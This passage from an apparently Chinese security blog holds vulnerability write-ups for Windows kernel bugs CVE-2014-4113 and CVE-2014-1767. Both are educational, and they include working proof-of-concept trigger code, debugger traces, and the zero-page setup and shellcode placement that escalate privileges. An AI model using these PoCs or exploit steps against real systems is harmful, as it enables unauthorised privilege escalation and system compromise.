<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0x8048500</span><br><span class="line">   0x8048500 &lt;system@plt&gt;:	jmp    DWORD PTR ds:0x804a028</span><br><span class="line">   0x8048506 &lt;system@plt+6&gt;:	push   0x38</span><br><span class="line">   0x804850b &lt;system@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048510 &lt;<span class="built_in">exit</span>@plt&gt;:	jmp    DWORD PTR ds:0x804a02c</span><br><span class="line">   0x8048516 &lt;<span class="built_in">exit</span>@plt+6&gt;:	push   0x40</span><br><span class="line">   0x804851b &lt;<span class="built_in">exit</span>@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048520 &lt;__libc_start_main@plt&gt;:	jmp    DWORD PTR ds:0x804a030</span><br><span class="line">   0x8048526 &lt;__libc_start_main@plt+6&gt;:	push   0x48</span><br><span class="line">   0x804852b &lt;__libc_start_main@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048530 &lt;setvbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a034</span><br></pre></td></tr></table></figure>
<h1 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h1><p>Pwn中的堆确实是比赛中考察的一个重点，要多练习</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>题目篇</category>
        <category>PWN</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>Use After Free</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2014-4113</title>
    <url>/2019/02/21/CVE-2014-4113/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>CVE-2014-4113是一个非常经典的内核漏洞，本片文章从Poc触发，分析如何构造Exploit，Poc的下载在文末的链接之中，实验平台是Windows 7 x86 sp1本次漏洞是一个释放后重用的漏洞，深入了解这个漏洞对内核的一些利用方法会有不一样的收获</p>
<h1 id="0x01：Poc分析"><a href="#0x01：Poc分析" class="headerlink" title="0x01：Poc分析"></a>0x01：Poc分析</h1><h2 id="栈回溯"><a href="#栈回溯" class="headerlink" title="栈回溯"></a>栈回溯</h2><p>我们假装不知道Poc源码，运行Poc进行栈回溯观察</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">win32k!xxxSendMessageTimeout+0xb3:</span><br><span class="line">95db93fa 3b7e08          cmp     edi,dword ptr [esi+8]</span><br><span class="line">2: kd&gt; kb</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 92efba64 95db95c5 fffffffb 000001ed 0014fde4 win32k!xxxSendMessageTimeout+0xb3</span><br><span class="line">01 92efba8c 95e392fb fffffffb 000001ed 0014fde4 win32k!xxxSendMessage+0x28</span><br><span class="line">02 92efbaec 95e38c1f 92efbb0c 00000000 0014fde4 win32k!xxxHandleMenuMessages+0x582</span><br><span class="line">03 92efbb38 95e3f8f1 fe9f30c8 95f1f580 00000000 win32k!xxxMNLoop+0x2c6</span><br><span class="line">04 92efbba0 95e3f9dc 0000001c 00000000 00000000 win32k!xxxTrackPopupMenuEx+0x5cd</span><br><span class="line">05 92efbc14 83e3f1ea 00020117 00000000 00000000 win32k!NtUserTrackPopupMenuEx+0xc3</span><br><span class="line">06 92efbc14 77c170b4 00020117 00000000 00000000 nt!KiFastCallEntry+0x12a</span><br><span class="line">07 0014fdf8 7619483e 76182243 00020117 00000000 ntdll!KiFastSystemCallRet</span><br><span class="line">08 0014fdfc 76182243 00020117 00000000 00000000 USER32!NtUserTrackPopupMenuEx+0xc</span><br><span class="line">09 0014fe1c 0127139f 00020117 00000000 00000000 USER32!TrackPopupMenu+0x1b</span><br><span class="line">0a 0014fedc 012715d4 00000001 002e7e38 002e7e98 Trigger!wmain+0x2af [D:\Trigger.cpp @ 224] </span><br><span class="line">0b (Inline) -------- -------- -------- -------- Trigger!invoke_main+0x1c [d:\agent\_work\4\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 90] </span><br><span class="line">0c 0014ff24 76073c45 7ffdc000 0014ff70 77c337f5 Trigger!__scrt_common_main_seh+0xfa [d:\agent\_work\4\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] </span><br><span class="line">0d 0014ff30 77c337f5 7ffdc000 77dd8776 00000000 kernel32!BaseThreadInitThunk+0xe</span><br><span class="line">0e 0014ff70 77c337c8 0127165c 7ffdc000 00000000 ntdll!__RtlUserThreadStart+0x70</span><br><span class="line">0f 0014ff88 00000000 0127165c 7ffdc000 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure>
<p>查看此时的 esi 情况，发现 esi 此时为 fffffffb，esi+8 处并没有映射内存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2: kd&gt; r</span><br><span class="line">eax=fffffe0d ebx=000001ed ecx=95f120e4 edx=92efbb78 esi=fffffffb edi=fe509b50</span><br><span class="line">eip=95db93fa esp=92efba3c ebp=92efba64 iopl=0         nv up ei ng nz na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286</span><br><span class="line">win32k!xxxSendMessageTimeout+0xb3:</span><br><span class="line">95db93fa 3b7e08          cmp     edi,dword ptr [esi+8] ds:0023:00000003=????????</span><br><span class="line">2: kd&gt; dd esi+8</span><br><span class="line">00000003  ???????? ???????? ???????? ????????</span><br><span class="line">00000013  ???????? ???????? ???????? ????????</span><br><span class="line">00000023  ???????? ???????? ???????? ????????</span><br><span class="line">00000033  ???????? ???????? ???????? ????????</span><br><span class="line">00000043  ???????? ???????? ???????? ????????</span><br><span class="line">00000053  ???????? ???????? ???????? ????????</span><br><span class="line">00000063  ???????? ???????? ???????? ????????</span><br><span class="line">00000073  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<p>我们在IDA里查看函数信息寻找一下这个 fffffffb 是如何产生的，首先找到崩溃点的位置从内向外开始分析，这里可以发现 esi 也就是我们的第一个参数 P</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxSendMessageTimeout</span><span class="params">(PVOID P, CHAR MbString, WCHAR UnicodeString, <span class="keyword">void</span> *Src, <span class="keyword">unsigned</span> <span class="keyword">int</span> HighLimit, <span class="keyword">unsigned</span> <span class="keyword">int</span> LowLimit, <span class="keyword">int</span> a7, PVOID Entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( gptiCurrent == *((PVOID *)P + <span class="number">2</span>) ) <span class="comment">// cmp     edi, [esi+8] =&gt; 蓝屏点</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续追溯到 <code>xxxSendMessage</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxSendMessage</span><span class="params">(PVOID P, CHAR MbString, WCHAR UnicodeString, <span class="keyword">void</span> *Src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  InterlockedIncrement(&amp;glSendMessage);</span><br><span class="line">  <span class="keyword">return</span> xxxSendMessageTimeout(P, MbString, UnicodeString, Src, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (PVOID)<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续往回追溯，我们只关注关键的代码，发现我们的第一个参数来自于<code>xxxMNFindWindowFromPoint</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxHandleMenuMessages</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, WCHAR UnicodeString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    v13 = (_DWORD *)xxxMNFindWindowFromPoint((WCHAR)v3, (<span class="keyword">int</span>)&amp;UnicodeString, (<span class="keyword">int</span>)v7);</span><br><span class="line">    ...</span><br><span class="line">    xxxSendMessage(v13, <span class="number">0xED</span>, UnicodeString, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来观察一下这个函数的返回值，我们的 esi 最后出问题的值就是 fffffffb(-5) 也就是说这个函数返回的是 fffffffb，我们在v5判断的下一句下断点我们可以得到这里的返回值来自<code>xxxSendMessage</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxMNFindWindowFromPoint</span><span class="params">(WCHAR UnicodeString, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  v5 = *(_DWORD *)(UnicodeString + <span class="number">0xC</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 ) <span class="comment">// 下一句下断点</span></span><br><span class="line">  &#123;</span><br><span class="line"> 	...</span><br><span class="line">    v6 = xxxSendMessage(</span><br><span class="line">           *(PVOID *)(v4 + <span class="number">0xC</span>),</span><br><span class="line">           <span class="number">0xEB</span>,</span><br><span class="line">           (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;UnicodeString,</span><br><span class="line">           (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int16)a3 | ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a3 &gt;&gt; <span class="number">0x10</span> &lt;&lt; <span class="number">0x10</span>)));</span><br><span class="line">    ThreadUnlock1();</span><br><span class="line">    <span class="keyword">if</span> ( IsMFMWFPWindow(v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v7) = <span class="number">1</span>;</span><br><span class="line">      v6 = HMValidateHandleNoSecure(v6, v7);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      *v3 = UnicodeString;</span><br><span class="line">      <span class="keyword">return</span> v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/21/CVE-2014-4113/11.png" alt="1566460832480"></p>
<p>我们在windbg中下断重新运行Poc之后到达了这里，我们单步查看<code>xxxSendMessage</code>函数的返回值发现是 fffffffb，通过观察我们发现这里传了一个1EBh的消息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; r</span><br><span class="line">eax=fea2bbd0 ebx=<span class="number">8e9</span>dcafc ecx=<span class="number">00000202</span> edx=<span class="number">00000000</span> esi=<span class="number">95f</span>1f580 edi=fe9f30c8</span><br><span class="line">eip=<span class="number">95e395</span>b9 esp=<span class="number">8e9</span>dca5c ebp=<span class="number">8e9</span>dca90 iopl=<span class="number">0</span>         nv up ei ng nz na po nc</span><br><span class="line">cs=<span class="number">0008</span>  ss=<span class="number">0010</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">0030</span>  gs=<span class="number">0000</span>             efl=<span class="number">00000282</span></span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x1b</span>:</span><br><span class="line"><span class="number">95e395</span>b9 <span class="number">8b</span>0d58ebf195    mov     ecx,dword ptr [win32k!gptiCurrent (<span class="number">95f</span>1eb58)] ds:<span class="number">0023</span>:<span class="number">95f</span>1eb58=fdbd7580</span><br><span class="line"><span class="number">3</span>: kd&gt; p</span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x21</span>:</span><br><span class="line"><span class="number">95e395</span>bf <span class="number">81</span>c1b4000000    add     ecx,<span class="number">0B</span>4h</span><br><span class="line">(若干次单步)</span><br><span class="line"><span class="number">3</span>: kd&gt; </span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x4b</span>:</span><br><span class="line"><span class="number">95e395</span>e9 <span class="number">68</span>eb010000      push    <span class="number">1</span>EBh <span class="comment">// 这里传入了一个 1EBh 的消息</span></span><br><span class="line"><span class="number">3</span>: kd&gt; </span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x50</span>:</span><br><span class="line"><span class="number">95e395</span>ee ff770c          push    dword ptr [edi+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">3</span>: kd&gt; </span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x53</span>:</span><br><span class="line"><span class="number">95e395</span>f1 e8a7fff7ff      call    win32k!xxxSendMessage (<span class="number">95</span>db959d)</span><br><span class="line"><span class="number">3</span>: kd&gt; </span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x58</span>:</span><br><span class="line"><span class="number">95e395</span>f6 <span class="number">8b</span>f0            mov     esi,eax</span><br><span class="line"><span class="number">2</span>: kd&gt; r</span><br><span class="line">eax=fffffffb ebx=<span class="number">8e9</span>dcafc ecx=<span class="number">8e9</span>dca34 edx=<span class="number">0013f</span>d48 esi=<span class="number">95f</span>1f580 edi=fe9f30c8</span><br><span class="line">eip=<span class="number">95e395</span>f6 esp=<span class="number">8e9</span>dca5c ebp=<span class="number">8e9</span>dca90 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">0008</span>  ss=<span class="number">0010</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">0030</span>  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">win32k!xxxMNFindWindowFromPoint+<span class="number">0x58</span>:</span><br><span class="line"><span class="number">95e395</span>f6 <span class="number">8b</span>f0            mov     esi,eax</span><br></pre></td></tr></table></figure>
<p>我们查询消息 1EBh 其原型是<code>MN_FINDWINDOWFROMPOINT</code>，我们现在知道了这个 fffffffb 产生的原因，就是<code>xxxSendMessage</code>函数处理1EBh 消息的返回值，因为返回的是 fffffffb ，后面<code>cmp     edi, [esi+8]</code>语句又对 0x3 地址进行了访问就造成了蓝屏，这就是漏洞产生的原因</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>我们查看一下 Poc 源码中是如何构造的，先从简单的分析，在main函数中我们可以大致得到如下代码片段，我们首先创建了一个主窗口，又新建了两个菜单并插入了新菜单项，然后我们调用了<code>SetWindowsHookExA</code>来拦截 1EBh 的消息，具体内容后面分析，最后我们调用了<code>TrackPopupMenu</code>函数触发漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	main_wnd = CreateWindowA(...);</span><br><span class="line">	MenuOne = CreatePopupMenu();</span><br><span class="line">	insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, TRUE, &amp;MenuOneInfo);</span><br><span class="line">	MenuTwo = CreatePopupMenu();</span><br><span class="line">	insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, TRUE, &amp;MenuTwoInfo);</span><br><span class="line">	setWindowsHook = SetWindowsHookExA(</span><br><span class="line">		WH_CALLWNDPROC, </span><br><span class="line">		HookCallback, </span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		GetCurrentThreadId()</span><br><span class="line">	);</span><br><span class="line">	TrackPopupMenu(</span><br><span class="line">		MenuTwo,  <span class="comment">//Handle to the menu we want to display, for us its the submenu we just created.</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Options on how the menu is aligned, what clicks are allowed etc, we don't care.</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Horizontal position - left hand side</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Vertical position - Top edge</span></span><br><span class="line">		<span class="number">0</span>,		 <span class="comment">//Reserved field, has to be 0</span></span><br><span class="line">		main_wnd, <span class="comment">//Handle to the Window which owns the menu</span></span><br><span class="line">		<span class="literal">NULL</span>	 <span class="comment">//This value is always ignored...</span></span><br><span class="line">		);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们来看一些有趣的细节，第一个点就是 main_wnd 中的消息处理函数，注释里面写的很清楚，这里首先判断消息是否进入了空闲状态，如果是则通过<code>PostMessageA</code>函数发送了三次异步消息，模拟了键盘和鼠标的操作从而达到漏洞点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Wait until the window is idle and then send the messages needed to 'click' on the submenu to trigger the bug</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"WindProc called with message=%d\n"</span>, msg);</span><br><span class="line">	<span class="keyword">if</span> (msg == WM_ENTERIDLE) &#123;</span><br><span class="line">		PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>);</span><br><span class="line">		PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>);</span><br><span class="line">		PostMessageA(hwnd, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Just pass any other messages to the default window procedure</span></span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, msg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二个点就是我们<code>SetWindowsHookExA</code>拦截 0x1EB 消息，这里<code>SetWindowLongA</code>设置了一次窗口函数是因为只有在窗口处理函数线程的上下文空间中调用<code>EndMenu</code>函数才有意义，我们调用<code>EndMenu</code>函数销毁了这个菜单，此时的<code>win32k!xxxSendMessage</code>函数进行调用就会失败，上层函数 <code>win32k!xxxMNFindWindowFromPoint</code>就会返回 fffffffb ，最后到达<code>win32k!xxxHandleMenuMessages</code>函数的时候再次调用<code>win32k!xxxSendMessage</code>时就出现了问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Destroys the menu and then returns -5, this will be passed to xxxSendMessage which will then use it as a pointer.</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">HookCallbackTwo</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Callback two called.\n"</span>);</span><br><span class="line">	EndMenu();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">HookCallback</span><span class="params">(<span class="keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Callback one called.\n"</span>);</span><br><span class="line">	<span class="comment">/* lParam is a pointer to a CWPSTRUCT which is defined as:</span></span><br><span class="line"><span class="comment">	typedef struct tagCWPSTRUCT &#123;</span></span><br><span class="line"><span class="comment">	LPARAM lParam;</span></span><br><span class="line"><span class="comment">	WPARAM wParam;</span></span><br><span class="line"><span class="comment">	UINT   message;</span></span><br><span class="line"><span class="comment">	HWND   hwnd;</span></span><br><span class="line"><span class="comment">	&#125; CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//lparam+8 is the message sent to the window, here we are checking for the message which is sent to a window when the function xxxMNFindWindowFromPoint is called</span></span><br><span class="line">	<span class="keyword">if</span> (*(DWORD *)(lParam + <span class="number">8</span>) == <span class="number">0x1EB</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) &#123;</span><br><span class="line">			<span class="comment">//lparam+12 is a Window Handle pointing to the window - here we are setting its callback to be our second one</span></span><br><span class="line">			SetWindowLongA(*(HWND *)(lParam + <span class="number">12</span>), GWLP_WNDPROC, (LONG)HookCallbackTwo);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><p>接下来就是我们最喜欢的漏洞利用环节了，让我们首先看一个令人兴奋的片段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">loc_95DB94E8:</span><br><span class="line">push    [ebp+Src]</span><br><span class="line">push    dword ptr [ebp+UnicodeString]</span><br><span class="line">push    ebx</span><br><span class="line">push    esi</span><br><span class="line">call    dword ptr [esi+<span class="number">60</span>h] <span class="comment">// call 0x5b</span></span><br><span class="line">mov     ecx, [ebp+arg_18]</span><br><span class="line">test    ecx, ecx</span><br><span class="line">jz      loc_95DB9591</span><br></pre></td></tr></table></figure>
<p>这个位置是哪里呢?让我用图片给你说明，因为零页可控，所以我们只需要考虑从漏洞点走到利用点，然后在 0x5c 处放置我们的shellcode即可提权</p>
<p><img src="/2019/02/21/CVE-2014-4113/22.png" alt="1566471330121"></p>
<p>期间我们有两处判断，第一处只需要赋值当前的<code>Win32ThreadInfo</code>结构即可，第二处判断赋值为4即可，最后放上我们的shellcode即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD __<span class="function">stdcall  <span class="title">ptiCurrent</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs:<span class="number">18</span>h		 <span class="comment">//eax pointer to TEB</span></span><br><span class="line">		mov eax, [eax + <span class="number">40</span>h] <span class="comment">//get pointer to Win32ThreadInfo</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(DWORD*)(<span class="number">0x3</span>) = (DWORD)ptiCurrent();</span><br><span class="line">*(DWORD*)(<span class="number">0x11</span>) = (DWORD)<span class="number">4</span>;</span><br><span class="line">*(DWORD*)(<span class="number">0x5b</span>) = (DWORD)&amp;ShellCode;</span><br></pre></td></tr></table></figure>
<p>最终的利用代码在 =&gt; <a href="https://github.com/ThunderJie/CVE/blob/master/CVE-2014-4113/CVE-2014-4113.c" target="_blank" rel="noopener">GitHub</a></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>其实这个漏洞我很早之前就分析过，但是都是分析的成品Exploit，当时不是很了解内核，分析起来非常吃力，现在重新回来分析一次又有不一样的收获，就像我现在分析CVE-2015-0057一样，毫无思绪，分析完这篇之后我会考虑分析CVE-2015-2546，最后再到CVE-2015-0057，说真的CVE-2015-0057这个洞弄了我很久，总而言之，慢慢来吧</p>
]]></content>
      <categories>
        <category>CVE</category>
        <category>Windows Kernel</category>
        <category>Use After Free</category>
      </categories>
      <tags>
        <tag>Use After Free</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2014-1767</title>
    <url>/2019/02/21/CVE-2014-1767/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这次分析一个内核漏洞，信息量有点大，有不对的地方欢迎指正，介绍一下这个漏洞吧，2014年“最佳提权漏洞奖”得主，影响力还是很大的，实验环境的一些文件我放到GitHub上了，需要的自行下载：<a href="https://github.com/ThunderJie/CVE/tree/master/CVE-2014-1767" target="_blank" rel="noopener">https://github.com/ThunderJie/CVE/tree/master/CVE-2014-1767</a></p>
<h1 id="0x01：实验环境"><a href="#0x01：实验环境" class="headerlink" title="0x01：实验环境"></a>0x01：实验环境</h1><ul>
<li>Windows 7 x86（虚拟机）</li>
<li>Windbg 10.0.17134.1 + virtualKD（双机调试）</li>
<li>Visual C++ 6.0（编译器）</li>
<li>IDA Pro（反汇编）</li>
<li>poc.exe</li>
<li>exp.exe</li>
</ul>
<h2 id="a-双机调试的环境如下："><a href="#a-双机调试的环境如下：" class="headerlink" title="a.双机调试的环境如下："></a>a.双机调试的环境如下：</h2><p><img src="/2019/02/21/CVE-2014-1767/环境配置.gif" alt="环境配置"></p>
<h2 id="b-poc的生成（VC6-0下编译）"><a href="#b-poc的生成（VC6-0下编译）" class="headerlink" title="b.poc的生成（VC6.0下编译）"></a>b.poc的生成（VC6.0下编译）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"WS2_32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   DWORD targetSize=<span class="number">0x310</span>;</span><br><span class="line">   DWORD virtualAddress=<span class="number">0x13371337</span>;</span><br><span class="line">   DWORD mdlSize=(<span class="number">0x4000</span>*(targetSize<span class="number">-0x30</span>)/<span class="number">8</span>)<span class="number">-0xFFF0</span>-(virtualAddress&amp; <span class="number">0xFFF</span>);</span><br><span class="line">   <span class="keyword">static</span> DWORD inbuf1[<span class="number">100</span>];</span><br><span class="line">   <span class="built_in">memset</span>(inbuf1,<span class="number">0</span>,<span class="keyword">sizeof</span>(inbuf1));</span><br><span class="line">   inbuf1[<span class="number">6</span>]=virtualAddress;</span><br><span class="line">   inbuf1[<span class="number">7</span>]=mdlSize;</span><br><span class="line">   inbuf1[<span class="number">10</span>]=<span class="number">1</span>;</span><br><span class="line">   <span class="keyword">static</span> DWORD inbuf2[<span class="number">100</span>];</span><br><span class="line">   <span class="built_in">memset</span>(inbuf2,<span class="number">0</span>,<span class="keyword">sizeof</span>(inbuf2));</span><br><span class="line">   inbuf2[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">   inbuf2[<span class="number">1</span>]=<span class="number">0x0AAAAAAA</span>;</span><br><span class="line">   WSADATA WSAData;</span><br><span class="line">   SOCKET s;</span><br><span class="line">   sockaddr_in sa;</span><br><span class="line">   <span class="keyword">int</span> ierr;</span><br><span class="line">   WSAStartup(<span class="number">0x2</span>,&amp;WSAData);</span><br><span class="line">   s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);</span><br><span class="line">   <span class="built_in">memset</span>(&amp;sa,<span class="number">0</span>,<span class="keyword">sizeof</span>(sa));</span><br><span class="line">   sa.sin_port=htons(<span class="number">135</span>);</span><br><span class="line">   sa.sin_addr.S_un.S_addr=inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">   sa.sin_family=AF_INET;</span><br><span class="line">   ierr=connect(s,(<span class="keyword">const</span> struct sockaddr *)&amp;sa,<span class="keyword">sizeof</span>(sa));</span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">char</span> outBuf[<span class="number">100</span>];</span><br><span class="line">   DWORD bytesRet;</span><br><span class="line">   DeviceIoControl((HANDLE)s,<span class="number">0X1207F</span>,(LPVOID)inbuf1,<span class="number">0x30</span>,outBuf,<span class="number">0</span>,&amp;bytesRet,<span class="literal">NULL</span>);</span><br><span class="line">   DeviceIoControl((HANDLE)s,<span class="number">0X120C3</span>,(LPVOID)inbuf2,<span class="number">0x18</span>,outBuf,<span class="number">0</span>,&amp;bytesRet,<span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞原理"><a href="#0x02：漏洞原理" class="headerlink" title="0x02：漏洞原理"></a>0x02：漏洞原理</h1><p>该漏洞是由于Windows的afd.sys驱动在对系统内存的管理操作中，存在着悬垂指针的问题。在特定情况下攻击者可以通过该悬垂指针造成内存的double free漏洞。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>Double free，内核相关知识等等</p>
<h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><h2 id="1-初步分析"><a href="#1-初步分析" class="headerlink" title="1.初步分析"></a>1.初步分析</h2><p>调试运行poc得到以下报错，崩溃原因是重复释放了一块已经被释放了的内存:<br><img src="/2019/02/21/CVE-2014-1767/1.png" alt="1"></p>
<p>调用堆栈信息:<br><img src="/2019/02/21/CVE-2014-1767/2.png" alt="2"></p>
<p>我们可以得到如下函数的调用关系:</p>
<blockquote>
<p>afd!AfdTransmitPackets-&gt;afd!AfdTliGetTpInfo-&gt;afd!AfdReturnTpInfo-&gt;nt!IoFreeMdl-&gt;nt!ExFreePoolWithTag-&gt;nt!KeBugCheck2</p>
</blockquote>
<p>可以看到，出问题的是afd模块，我们查看afd模块详细信息:<br><img src="/2019/02/21/CVE-2014-1767/3.png" alt="3"></p>
<p>得到以上分析后，我们需要搞清楚poc做了什么事情，首先初始化本地socket连接，然后发送了两次数据，poc一共调用了两次DeviceIoControl函数，向控制码0x1207F和0x120C3发送了数据，我们直接从这两次IO控制码分发函数入手。</p>
